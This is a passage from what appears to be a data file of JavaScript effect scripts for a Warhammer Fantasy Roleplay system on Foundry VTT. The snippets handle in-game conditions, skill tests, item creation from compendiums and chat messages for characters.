args.opposedTest.result.other.push(\"Impact against Skaven\")\n}","Xf4FcZ4ZLdWmOXBa":"return args.skill?.name != game.i18n.localize(\"NAME.Perception\") && !args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\"));","XfRvVBTVIuAm8RaZ":"return args.item?.name != game.i18n.localize(\"NAME.CharmAnimal\")","Xg4qHLsyXGuUZfT8":"this.actor.hasCondition(\"ablaze\")?.delete();","Xk9XPklxxTvFlwpI":"args.options.useOnesArgumentative = true;","XthZ3GCC3WhsEI2g":"args.update({light : {\n    \"dim\": 10,\n    \"bright\": 5,\n    \"alpha\": 0.5,\n    \"animation\": {\n        \"speed\": 4,\n        \"intensity\": 4,\n        \"type\": \"flame\",\n    },\n    \"color\": \"#ac9e6c\",\n}});","Xu5cED1MhT4ba7da":"args.fields.modifier += 10\n","XuFxKPYheYF4WMmQ":"return args.skill?.name != game.i18n.localize(\"NAME.Cool\");","Y6ppJBerpM3TtSic":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.g4Q6AtzZuo5iIvD4\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], {fromEffect : this.effect.id});","Y7McxsHFeGhwQx0J":"this.actor.createEmbeddedDocuments(\"Item\", [expandObject({\n    name : \"Ghostly Flame\",\n    type : \"weapon\",\n    img : this.effect.img,\n    system : {\n        \"weaponGroup.value\" : \"throwing\",\n        \"damage.value\" : \"SB + WPB\",\n        \"qualities.value\" : [{name : \"magical\"}],\n        \"equipped\" : true\n    }\n})], {fromEffect: this.effect.id})","Y8J66v8VTKUASGuK":"if (!this.actor.effects.find(e => e.isCondition))\n{\n\treturn this.script.scriptNotification(\"No Conditions on this Actor\")\n}\n\nlet choice = await ItemDialog.create(this.actor.effects.filter(i => i.isCondition), 1, \"Choose a Condition\")\n\nif (choice[0])\n{\n\tawait this.actor.removeCondition(choice[0].conditionId)\n}\n\nif (this.actor.effects.find(e => e.isCondition))\n{\n    return false; // Delete the effect if there are still conditions, otherwise, effect remains and provides the bonus\n}","YDqpKJVy8ijEKdLX":"return !(this.actor.attacker && (args.skill?.name.includes(\"Melee (Basic)\") || (args.type == \"weapon\" && args.item?.system.weaponGroup.value == \"basic\")))","YEBw2CzHYxsTpTy5":"return args.skill?.name == game.i18n.localize(\"NAME.Haggle\");","YFSgWRXel0bWE3EE":"return [\"ag\", \"ws\", \"bs\"].includes(args.characteristic) || args.skill?.name == game.i18n.localize(\"NAME.Climb\");","YHEIkBKWXKNPqglh":"if (args.test.result.castOutcome == \"success\")\n{\n    game.wfrp4e.utility.postCorruptionTest(\"moderate\", this.script.getChatData())\n}\n","YJX7WnxzXXIVdH6P":"let lore = await ValueDialog.create(\"Choose Lore\", \"Lore\", \"\", {\"fire\" : \"Fire\", \"death\" : \"Death\", \"metal\" : \"Metal\", \"shadow\" : \"Shadow\"});\n\nlet filters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"petty\"\n    }\n]\n\nlet petty = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 6, \"Choose 3 Petty Spells\")\n\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : [\"\"]\n    }\n]\n\nlet arcane = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 12, \"Choose 12 Arcane Spells\")\n\nlet items = petty.map(i => i.toObject()).concat(arcane.map(i => {\n    let spell = i.toObject();\n    spell.img = `modules/wfrp4e-core/icons/spells/${lore}.png`\n    spell.system.lore.value = lore;\n    return spell;\n}));\n\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);","YMaxpXnml01bLGpO":"return args.item?.name.includes(game.i18n.localize(\"NAME.Stealth\"))","YN8719gme9AxYtyY":"let characteristics = {\n    \"ws\" : 10,\n    \"bs\" : 0,\n    \"s\" : 5,\n    \"t\" : 15,\n    \"i\" : 20,\n    \"ag\" : 15,\n    \"dex\" : 20,\n    \"int\" : 35,\n    \"wp\" : 30,\n    \"fel\" : 10\n}\nlet skills = [\"Channelling\", \"Cool\", \"Dodge\", \"Entertain (Storytelling)\", \"Intuition\", \"Language (Magick)\", \"Leadership\", \"Lore (Magic)\", \"Lore (Theology)\", \"Perception\"]\nlet skillAdvancements = [20, 25, 20, 25, 30, 25, 15, 20, 10, 30]\n\nlet talents = [\"Aethyric Attunement\", \"Instinctive Diction\", \"Instinctive Diction\", \"Luck\", \"Magical Sense\", \"Menacing\", \"Arcane Magic\", \"Petty Magic\", \"Second Sight\", \"Sixth Sense\"]\nlet trappings = [\"Hand Weapon\", \"Robes\", \"Quarterstaff\"]\nlet specialItems = [ \n    {name: \"Magic Item\", type: \"trapping\", trappingType: \"misc\" }, \n]    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nlet ride = await Dialog.confirm({title : \"Skill\", content : \"Add Chaos Steed and +20 Ride (Horse)?\"})\n\nif (ride)\n{\n    let skill = await game.wfrp4e.utility.findSkill(\"Ride (Horse)\")\n    skill = skill.toObject();\n    skill.system.advances.value = 20;\n    items = items.concat({name : \"Chaos Steed\", type: \"trapping\", \"system.trappingType.value\" : \"misc\"}, skill)\n}\n\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","YOKoZFlBEpFavfOS":"return args.type == \"channelling\"","YQ2LnLxp0xgy3meI":"if (args.test.preData.options?.corruption && args.test.failed) {\n  args.test?.result?.other.push(\"Gain additional +1 Corruption from \" + this.effect.name)\n}","YRUTliBzAQvncGNX":"this.actor.addCondition(\"fatigued\");\nthis.script.scriptNotification(\"Added Fatigued\")","YaKnYEbmmZZtByJc":"if (args.opposedTest.attackerTest.options.ballockKnife)\n{\n    args.weaponProperties.impale = true;\n    args.extraMessages.push(`<strong>${this.item.name}</strong>: Impale Added`)\n}","Yf2MmOzazzMdmoPU":"let armour = await fromUuid(\"Compendium.wfrp4e-core.items.VUJUZVN3VYhOaPjj\")\nlet armourData = armour.toObject()\narmourData.system.specification.value = 1\n \nlet fury = await fromUuid(\"Compendium.wfrp4e-core.items.fjd1u9VAgiYzhBRp\");\nlet furyData = fury.toObject();\n\nlet horns = await fromUuid(\"Compendium.wfrp4e-core.items.BqPZn6q3VHn9HUrW\")\nlet hornsData = horns.toObject()\nhornsData.system.specification.value = 6\n\nthis.actor.createEmbeddedDocuments(\"Item\", [armourData, furyData, hornsData], {fromEffect : this.effect.id})","YhhiWEQbox3WZA3Q":"return args.skill?.name == game.i18n.localize(\"NAME.Heal\") && game.combat?.active","YjAIsFlxKTJvYs60":"this.item.system.reduceQuantity();","YjJcRdytVRm88qLn":"args.options.additionalDamage = 1","YsS2RZsl2ZsqjhWV":"return !args.fields.charging","YsUdMhQ2AArcJIqy":"let choice1 = [\n    {\n        type: \"trait\",\n        name: \"Corruption (Minor)\",\n        diff : {\n            system : {\n                specification : {\n                    value : \"Minor\"\n                }\n            }\n        }\n    },\n    {\n        type: \"trait\",\n        name: \"Infected\",\n    },\n    {\n        type: \"trait\",\n        name: \"Territorial\",\n    }\n]\n\nlet updateObj;\nlet actor;\n\nasync function addTrait(c) {\n    let items = [];\n    let existing;\n    if (c.type == \"trait\") {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type);\n    }\n    if (!existing) {\n        let item = await game.wfrp4e.utility.find(c.name, c.type);\n        if (item) {\n            item = item.toObject();\n            foundry.utils.mergeObject(item, c.diff);\n            items.push(item);\n        }\n        else\n            ui.notifications.warn(`Could not find ${c}`, { permanent: true });\n    }\n    actor.createEmbeddedDocuments(\"Item\", items);\n}\n\nasync function dialogChoice() {\n    for (let c of choice1) {\n        await new Dialog({\n            title: \"Option\",\n            content:\n                `<p>\n            Add Option?\n            </p>\n            <ol>\n            <li>${c.name}</li>\n            </ol> \n            `,\n            buttons: {\n                1: {\n                    label: \"Yes\",\n                    callback: () => {\n                        addTrait(c)\n                        c.valid = true;\n                    }\n                },\n                2: {\n                    label: \"No\",\n                    callback: () => {\n                    }\n                }\n            }\n        }).render(true)\n    }\n}\n\nupdateObj = this.actor.toObject();\nactor = this.actor\nawait dialogChoice();\n\n","YwLEw4BiKq4EMy57":"let i_gain = (await new Roll(\"2d10\").roll()).total\nlet fel_gain = 0\nif (args.actor.characteristics.fel.value <= 0)\n{\n   fel_gain += (await new Roll(\"2d10\").roll()).total\n}\n\nlet msg = `<b>${this.actor.prototypeToken.name}</b> gains ${i_gain} Intelligence`\n\nif (fel_gain)\n   msg += ` and ${fel_gain} Fellowship`\n\n\nlet newInt = i_gain + args.actor.characteristics.int.modifier\nlet newFel = fel_gain + args.actor.characteristics.fel.modifier\n\nargs.actor.update({\"system.characteristics.int.modifier\" : newInt, \"system.characteristics.fel.modifier\" : newFel})\n\nthis.script.scriptMessage(msg)","YyKU2rIRmFSCqSlW":"let newEffect = this.effect.sourceItem.effects?.contents[1]\n\nif (newEffect)\n{\n    this.actor.createEmbeddedDocuments(\"ActiveEffect\", [newEffect.convertToApplied()]);\n}","YySjPfSAPdMAfjsh":"let talents = [\"Berserk Charge\", \"Combat Aware\", \"Combat Reflexes\", \"Furious Assault\", \"Implacable\", \"Magic Resistance\", \"Resistance (Magic)\", \"Resolute\", \"Strike Mighty Blow\", \"Warrior Born\"];\nlet currentCareer = this.actor.system.currentCareer;\n\nif (!currentCareer) return;\n\nfor (let talent of talents) {\n  if (currentCareer.system.talents.includes(talent))\n    continue;\n  currentCareer.system.talents.push(talent);\t\n}\n\n","Z1zriXibT0mAmdhb":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.BqPZn6q3VHn9HUrW\")\nitem = item.toObject()\nitem.name = this.effect.name\nitem.system.specification.value = this.actor.characteristics.s.bonus\nitem.system.description.value = \"\"\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","Z30zYayPryXOjT5N":"args.item.system.damage.value = \"SB + 6\";","Z41L3MwOpJdAjVaj":"if (args.actorsystem.details.move.sail.value > 0)\n  args.actor.system.details.move.sail.value -= 2;\n","Z4WrrlVGpPY4iUbG":"await this.actor.addCondition(\"ablaze\")","Z52yZDm6lP6fOP3O":"let ablaze = this.actor.hasCondition(\"ablaze\")\nif (ablaze)\n{\n    this.script.scriptNotification(\"Immune to Ablaze\");\n    ablaze.delete()\n}","Z6OmmC0irJzxSnMH":"let chatData = { whisper: ChatMessage.getWhisperRecipients(\"GM\") }\nlet message = \"\"\n\nlet wounds = foundry.utils.duplicate(this.actor.status.wounds)\nlet regenRoll = await new Roll(\"1d10\").roll();\nlet regen = regenRoll.total;\n\nif (wounds.value >= wounds.max)\n    return\n\nif (wounds.value > 0) \n{\n    wounds.value += regen\n    if (wounds.value > wounds.max)\n    {\n        wounds.value = wounds.max\n    }\n    message += `<b>${this.actor.name}</b> regains ${regen} Wounds.`\n\n    if (regen == 10)\n    {\n        message += `<br>Additionally, they regenerate a Critical Wound.`\n    }\n}\nelse if (regen >= 8) \n{\n    message += `<b>${this.actor.name}</b> rolled a ${regen} and regains 1 Wound.`\n    wounds.value += 1\n    if (regen == 10)\n    {\n        message += `<br>Additionally, they regenerate a Critical Wound.`\n    }\n}\nelse \n{\n    message += `<b>${this.actor.name}</b> Regenerate roll of ${regen} - No effect.`\n}\n\nawait this.actor.update({ \"system.status.wounds\": wounds })\nthis.script.scriptMessage(message, { whisper: ChatMessage.getWhisperRecipients(\"GM\") })\n\nif (this.actor.Species?.toLowerCase() != \"ogre\")\n{\n   this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name, fields : {difficulty : \"average\"}}).then(test => {\n       test.roll()\n   })\n}\n\n\n\n\n\n\n\n\n\n\n\n\n","Z6jNlyZMECkW4Hon":"let spells = await game.wfrp4e.utility.findAll(\"spell\", \"Loading Spells\", true);\n\nlet choice = await ItemDialog.create(spells, 1);\n\nif (choice[0])\n{\n    this.script.scriptMessage(`Chose @UUID[${choice[0].uuid}]{${choice[0].name}}`)\n    let spell = (await fromUuid(choice[0].uuid)).toObject(); // Might be an index so retrieve item object for sure\n    foundry.utils.setProperty(spell, \"flags.wfrp4e.boonOfTzeentch\", true);\n    spell.system.wind.value = \"Channelling (Dhar)\";\n    spell.system.memorized.value = true;\n    this.actor.createEmbeddedDocuments(\"Item\", [spell], {fromEffect: this.effect.id})\n}","ZCBcwbVFHFTFRntb":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpentry)';\nconst difficulty = 'easy';\nconst target = 10;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","ZCkYe5XMVY1RWMXG":"args.options.wallcrawler = true;","ZCrfdLPOxiNDCDSg":"this.actor.effects.get(this.effect.id).delete(); // can't use this.effect because it thinks it's parent is the item, but it actually is the actor","ZCuOjLAeENKN1Q4L":"let halve;\nif (args.opposedTest.attackerTest.item?.type != \"spell\")\n{\n    halve = await Dialog.confirm({title : this.effect.name, content : \"Halve Damage? (Halves Damage from all fire)\"})\n}\nelse\n{\n    halve = args.opposedTest.attackerTest.item?.system.lore?.value == \"fire\";\n}\n\nif (halve)\n{\n    args.totalWoundLoss /= 2;\n    args.modifiers.other.push({label : this.effect.name, details : \"Halved\", value : \"× 0.5\"})\n}","ZEXhYJqqxF6QAixX":"return args.options.terror || args.extendedTest?.getFlag(\"wfrp4e\", \"fear\");","ZEdDcBka21rnMuz5":"let initiativeSetting = game.settings.get(\"wfrp4e\", \"initiativeRule\")\n\nswitch (initiativeSetting) {\n  case \"default\":\n    args.initiative += \"+10\"\n    break;\n\n  case \"sl\":\n    args.initiative += \"+1\"\n    break;\n\n  case \"d10Init\":\n    args.initiative += \"+10\"\n    break;\n\n  case \"d10InitAgi\":\n    args.initiative += \"+1\"\n    break;\n}","ZGlJnrIemqul24j7":"let infected = await fromUuid(\"Compendium.wfrp4e-core.items.V0c3qBU1CMm8bmsW\")\nlet bite = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet biteData = bite.toObject();\nlet infectedData = infected.toObject();\n\nbiteData.system.specification.value = 4 - this.actor.characteristics.s.bonus\n\nthis.actor.createEmbeddedDocuments(\"Item\", [biteData, infectedData], {fromEffect : this.effect.id})","ZI2YnAAGoLpmVDIL":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.aE3pyW20Orvdjzj0\")\nlet data = item.toObject();\ndata.system.specification.value = \"Religion\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","ZJy2rvpKmUHXGrAi":"args.actor.details.move.run *= 1.5","ZLspFT2I3ZdWWr2H":"return args.skill?.name !== game.i18n.localize(\"NAME.Leadership\");","ZMwJad6v4G13SgjR":"return args.type == \"cast\" || args.type == \"channelling\"","ZNW3ubbKIYXAyE48":"let wounds = this.actor.itemTypes.disease.filter(i => i.name == \"Festering Wound\" && i.system.duration.active);\nlet selected;\nif (wounds.length == 0)\n{\n    return this.script.scriptNotification(\"No Festering Wounds!\");\n}\nelse if (wounds.length == 1)\n{\n    selected = wounds[0];\n}\nelse if (wounds.length >= 2)\n{\n    selected = (await ItemDialog.create(wounds, 1))[0];\n}\n\nif (selected)\n{\n    let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty : \"average\"}})\n    await test.roll();\n    if (test.succeeded)\n    {\n        let SL = parseInt(test.result.SL);\n        if (SL >= 0)\n        {\n            selected.update({\"system.duration.value\" : selected.system.duration.value - SL})\n            this.script.scriptMessage(`<strong>${selected.name}</strong> duration reduced by ${SL}!`)\n        }\n    }\n}","ZNu4B0OdjkM9lmtu":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.9h82z72XGo9tfgQS\")\nlet data = item.toObject();\ndata.name = data.name += \" (Vision)\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","ZOgtDW3mkTfeyc5M":"args.actor.system.details.price.gc += args.actor.system.details.price.gc * 0.1;","ZRoG7GiMDQWso6gN":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpentry)';\nconst difficulty = 'difficult';\nconst target = 30;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","ZTE8LdRblyG4yYoE":"if (args.test.result.castOutcome == \"success\")\n{\n    // Wait till after chat card is posted\n    game.wfrp4e.utility.sleep(500).then(() => {\n        game.wfrp4e.utility.postTerror(1, this.effect.name)\n        game.wfrp4e.utility.postTerror(2, this.effect.name)\n    })\n}","ZYsMgB4BwXBJcpYf":"// The wearer of the cloak causes Fear 2 \n// in Wolves, Lions, Goats, and Chimeras.\ngame.wfrp4e.utility.postFear(2, this.effect.name)\n","ZbuW8y7t9Y8oUFWq":"return !((args.type == \"weapon\" && (args.item.system.weaponGroup.value == \"blackpowder\" || args.item.system.weaponGroup.value == \"engineering\")) || (args.type == \"cast\" && args.item.system.lore.value == \"fire\"))","ZdHvGvSJBsIuPphF":"return !args.fields.dualWielding && !args.options.dualWieldOffhand","Ze9E2zR1GFGWGMVH":"return [\"Pick Lock\", \"Sleight of Hand\", \"Channelling (Ulgu)\"].includes(args.skill?.name)","ZhuitY1KOU1Xe7cP":"return !args.weapon?.system.properties.qualities.pummel","ZingXNvYyZ2BEvfY":"let characteristics = {\n    \"ws\" : 10,\n    \"bs\" : 0,\n    \"s\" : 5,\n    \"t\" : 5,\n    \"i\" : 10,\n    \"ag\" : 0,\n    \"dex\" : 0,\n    \"int\" : 0,\n    \"wp\" : 0,\n    \"fel\" : 0\n}\nlet skills = [\"Cool\", \"Dodge\", \"Language (Battle)\"]\nlet skillAdvancements = [10, 10, 10]\n\nlet talents = [\"Combat Reflexes\", \"Resolute\"]\nlet trappings = [\"Plate Breastplate\", \"Plate Bracers\", \"Plate Helm\", \"Plate Leggings\"]\n\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nlet weapons = await game.wfrp4e.utility.findAll(\"weapon\", \"Loading Weapons\");\n\nitems = items.concat((await game.wfrp4e.apps.ItemDialog.create([await fromUuid(\"Compendium.wfrp4e-core.items.Item.1zaqojk0Oq1m8vYv\"), await fromUuid(\"Compendium.wfrp4e-core.items.Item.bBX8MP6QfcyU6Fy3\")], 1, \"Choose a Weapon\")) || [])\n\nlet choices = weapons.filter(i => i.system.properties.qualities.shield || i.system.weaponGroup.value == \"polearm\" || i.system.weaponGroup.value == \"twohanded\");\n\nitems = items.concat(await game.wfrp4e.apps.ItemDialog.create(choices, 1, \"Choose a Shield or Polearm or Two-Handed Weapon\"));\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","ZqTW093qENOwGONP":"let msg = \"\"\n\nlet SL = parseInt(this.effect.sourceTest.result.SL);\n\nfor(let i = 0; i < SL; i++)\n{\n    msg += `<p>${await this.actor.applyBasicDamage(3, {suppressMsg : true, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP})}</p>`\n}\n\nthis.script.scriptMessage(msg);","ZrePyV2spv3v65Tg":"return args.type != \"weapon\" && !this.actor.statuses.has(\"infighting\")","ZsQR3AVKi0v5U593":"args.actor.addCondition(\"ablaze\", 2)","ZuoIVv3nmlGhhdx0":"let rating = parseInt(this.effect.name.match(/\\d+/)?.[0]) || 1;\nlet holed = this.actor.flags.holed || {holed: 0};\nholed.holed += rating;\nthis.actor.flags.holed = holed;\n","ZvbBM4gTJHPdU8jU":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"hard\"}})\nawait test.roll();\nreturn test.failed","Zxh4RAENoaAQAaNg":"return !this.actor.flags.useless.rEye || !this.actor.flags.useless.lEye || [\"wp\", \"t\", \"s\"].includes(args.characteristic)","ZxtOdwsM2Sqj9Zam":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.AtpAudHA4ybXVlWM\")\nlet data = item.toObject();\ndata.system.specification.value = 0\ndata.name = this.effect.name;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","a02tlRCXpaoaDjSN":"let careers = await game.wfrp4e.utility.findAll(\"career\", \"\", true);\ncareers.forEach(c => {\n    if (!c.id)\n    {\n        c.id = c._id;\n    }\n});\nlet choice = await ItemDialog.create(careers, 1, \"Choose Double Life Career\");\nif (choice[0])\n{\n    let career = await fromUuid(choice[0].uuid);\n    let data = career.toObject();\n    foundry.utils.setProperty(data, \"flags.wfrp4e.doubleLife\", true);\n    this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n    this.effect.updateSource({name : this.effect.name + ` (${data.name})`})\n}\n","a0YU3whUm16wGBNu":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"average\"}})\nawait test.roll();\n\nif (test.failed)\n{\n    this.actor.addCondition(\"fatigued\");\n}","a4Aza4a9v8JMU8dC":"const talents = await Promise.all([\"Frenzy\", \"Magic Resistance\"].map(game.wfrp4e.utility.findTalent))\nthis.actor.createEmbeddedDocuments(\"Item\", talents, {fromEffect : this.effect.id})","a6gacHsvgwtsIFSQ":"if (args.test.item && args.test.item.name == game.i18n.localize(\"NAME.Research\"))\n    args.test.preData.canReverse = true","a7pEvCycVnFBXGAQ":"let test = await this.actor.setupCharacteristic(\"i\", {skipTargets: true, appendTitle :  \" - Stunned\", fields : {difficulty : \"easy\"}})\nawait test.roll();\n\nif (!test.succeeded)\n{\n\tthis.actor.addCondition(\"stunned\");\n}","a8RabrnJ08O07rDX":"if (args.totalWoundLoss > 0)\n{\n    // I'm assuming the endurance test specified is for the end-round check\n    await args.actor.addCondition(\"poisoned\", 2);\n}","a8i0sA1RBnD8nHZt":"let caster = this.effect.sourceActor\nlet targetedItem = this.actor.items.get(this.effect.flags.wfrp4e.itemTargets[0])\n\nlet qualities = foundry.utils.deepClone(game.wfrp4e.config.itemQualities);\nlet flaws = foundry.utils.deepClone(game.wfrp4e.config.itemFlaws);\n\nif (targetedItem.type == \"weapon\")\n{\n    foundry.utils.mergeObject(qualities, game.wfrp4e.config.weaponQualities)\n    foundry.utils.mergeObject(flaws, game.wfrp4e.config.weaponFlaws)\n}\nelse if (targetedItem.type == \"armour\")\n{\n    foundry.utils.mergeObject(qualities, game.wfrp4e.config.armorQualities)\n    foundry.utils.mergeObject(flaws, game.wfrp4e.config.armorFlaws)\n}\n\nfor(let q in qualities)\n{\n    // If the weapon already has a flaw, don't put it in the dialog\n    if (targetedItem.system.properties.qualities[q])\n    {\n        delete qualities[q]\n    }\n}\nfor(let f in flaws)\n{\n    // If a weapon doesn't have a flaw, don't put it in the dialog\n    if (!targetedItem.system.properties.flaws[f])\n    {\n        delete flaws[f]\n    }\n}\n            \nlet added = await ItemDialog.create(ItemDialog.objectToArray(qualities), \"unlimited\", \"Choose Qualities to add\");\nlet removed = []\nif (!foundry.utils.isEmpty(flaws))\n{\n    removed = await ItemDialog.create(ItemDialog.objectToArray(flaws), \"unlimited\", \"Choose Flaws to remove\");\n}\n\nthis.effect.updateSource({\"flags.wfrp4e.propertiesChanged\" : {added : added.map(i => i.id), removed : removed.map(i => i.id)}})\n","aAvJrAKLzXhS9qN6":"return args.item?.name == game.i18n.localize(\"NAME.Climb\")","aCVtaW8ag1WibcAr":"args.attacker.modifyWounds(1)\nthis.script.scriptMessage(`<strong>${args.attacker.prototypeToken.name}</strong> recovers 1 Wound.`)","aIYUsBIDKWJ3CEtj":"this.script.scriptMessage(await this.actor.applyBasicDamage(20, {suppressMsg: true}));","aMHGjWyn6BXCI4pw":"let frenzy = await fromUuid(\"Compendium.wfrp4e-core.items.Item.hXcfygzujgyMN1uI\");\nthis.actor.createEmbeddedDocuments(\"Item\", [frenzy], {fromEffect: this.effect.id})","abLWYtNTu1UVDQAs":"if (args.opposedTest.result.hitloc.value == this.effect.flags.wfrp4e.location) // e.g. 'head', rLeg, 'lArm'\n{\n     this.scriptMessage(`Gains a @Condition[Blinded] condition as their <strong>${this.item.name}</strong> was hit`);\n     this.actor.addCondition(\"blinded\");\n}","abVIvJBzuskNzCQv":"let amount = this.effect.sourceTest.result.overcast.usage.other.current;\n\nlet sss = await fromUuid(\"Compendium.wfrp4e-core.items.MGEPI4jNhymNIRVz\");\nlet strider = await fromUuid(\"Compendium.wfrp4e-core.items.1dUizIgLBgn4jICC\");\n\nlet items = Array(amount).fill(sss).concat(Array(amount).fill(strider))\n\nthis.actor.createEmbeddedDocuments(\"Item\", items, 